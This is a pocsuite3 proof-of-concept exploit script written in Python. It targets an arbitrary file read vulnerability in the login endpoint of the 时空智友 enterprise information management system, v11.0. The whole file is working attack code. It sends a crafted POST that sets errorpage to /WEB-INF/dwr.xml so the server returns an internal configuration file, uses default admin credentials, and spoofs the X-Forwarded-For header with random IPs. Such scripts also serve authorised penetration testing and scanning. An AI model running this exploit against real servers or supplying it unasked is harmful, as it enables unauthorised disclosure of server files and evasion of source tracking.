#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-19'
    createDate = '2023-11-19'
    updateDate = '2023-11-19'
    references = []
    name = '时空智友_Login任意文件读取'
    appPowerLink = ''
    appName = '时空智友企业信息管理'
    appVersion = 'v11.0'
    vulType = 'Arbitrary File Read'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': tools.get_random_ip()
        }
        data = "op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin"
        res = requests.post(url=f"{self.url}/login", headers=headers, data=data, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return "UserAccess" in res.text and res.headers['Content-Type'] == 'application/xml' and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    '[ Success ] 时空智友_Login任意文件读取': self.url
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
